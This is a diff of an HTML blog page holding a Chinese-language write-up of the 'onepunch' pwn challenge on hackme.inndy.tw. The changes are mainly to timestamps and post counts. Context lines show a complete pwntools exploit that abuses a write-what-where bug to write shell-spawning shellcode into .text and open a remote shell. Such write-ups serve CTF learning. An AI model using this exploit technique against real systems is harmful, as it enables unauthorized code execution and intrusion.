@@ -28,7 +28,7 @@
 <meta property="og:description" content="hackme.inndy.tw onepunch (pwn)challengenc hackme.inndy.tw 7718 Punch! 保護機制Partial RELRO, NX, Canary 分析程式邏輯main: 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **en">
 <meta property="og:locale" content="zh_TW">
 <meta property="article:published_time" content="2020-10-16T11:39:06.000Z">
-<meta property="article:modified_time" content="2020-10-16T12:43:31.061Z">
+<meta property="article:modified_time" content="2020-11-29T11:23:10.239Z">
 <meta property="article:author" content="wh0am1">
 <meta name="twitter:card" content="summary">
 
@@ -173,10 +173,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-16 19:39:06 / 修改時間：20:43:31" itemprop="dateCreated datePublished" datetime="2020-10-16T19:39:06+08:00">2020-10-16</time>
+              <time title="創建時間：2020-10-16 19:39:06" itemprop="dateCreated datePublished" datetime="2020-10-16T19:39:06+08:00">2020-10-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2020-11-29 19:23:10" itemprop="dateModified" datetime="2020-11-29T19:23:10+08:00">2020-11-29</time>
+              </span>
 
           
 
@@ -221,9 +227,6 @@
 <p>以我的exploit為例, 是跳轉到<code>__libc_csu_init</code> 因為空間夠大</p>
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>注意最後要再patch回來</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># new code based on Writeup: https://blog.csdn.net/kevin66654/article/details/88563770</span></span><br><span class="line"><span class="comment"># seems better (?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x00400790</span> <span class="comment"># __libc_csu_init</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7718</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>, <span class="string">&#x27;0x400768 137&#x27;</span>)</span><br><span class="line"><span class="comment"># time.sleep(0.5)</span></span><br><span class="line"><span class="comment"># p.sendline(&#x27;0x400763 -2&#x27;)</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sc)):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(hex(base + i) + <span class="string">&#x27; &#x27;</span> + str(ord(sc[i])))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[+] Wrote %d bytes to .text&#x27;</span> % (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+] Wrote shellcode to .text&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;0x400768 39&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-
-<p>p.s. 寫到csu是我看別人writeup之後改的</p>
-
     </div>
 
     
@@ -317,12 +320,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">標籤</span>
       </div>
   </nav>
